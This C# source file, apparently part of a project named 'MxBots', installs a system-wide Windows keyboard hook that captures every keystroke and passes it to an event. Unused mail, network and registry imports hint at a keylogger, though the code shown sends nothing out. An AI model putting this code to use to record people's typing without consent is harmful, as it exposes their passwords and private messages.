using System;
using System.Diagnostics;
using System.Timers;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Net;
using System.Net.Mail;
using Microsoft.Win32;

namespace MxBots
{

   public class appstart
    {
        public static byte caps = 0, shift = 0;

        
       public class InterceptKeys
        {
            private const int WH_KEYBOARD_LL = 13;
            private const int WM_KEYDOWN = 0x0100;
            private static LowLevelKeyboardProc _proc = HookCallback;
            private static IntPtr _hookID = IntPtr.Zero;
            public static event KeyTransfertEventHandler appuyé;

            public static void Launch()
            {
                _hookID = SetHook(_proc);
  
               
               
            }
            public static void exit()
            {
              
                UnhookWindowsHookEx(_hookID);
            }

            private static IntPtr SetHook(LowLevelKeyboardProc proc)
            {
                using (Process curProcess = Process.GetCurrentProcess())
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
                }
            }

            private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
            
            private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
            {
              
                if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
                {
                

                    int vkCode = Marshal.ReadInt32(lParam);

                    appuyé(new KeyTransfertEventArg(vkCode));
                  
                    

                    
                }
                return CallNextHookEx(_hookID, nCode, wParam, lParam);
            }

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            private static extern bool UnhookWindowsHookEx(IntPtr hhk);

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

            [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr GetModuleHandle(string lpModuleName);
        }
    }
   public class KeyTransfertEventArg : EventArgs
   {
       private int key;


       public KeyTransfertEventArg()
           : this(0)
       {
       }

       public KeyTransfertEventArg(int key)
           : base()
       {
           this.key = key;

       }
       public Keys Key
       {
           get
           {
               return (Keys)key;
           }
       }

   }
   public delegate void KeyTransfertEventHandler(KeyTransfertEventArg e);
}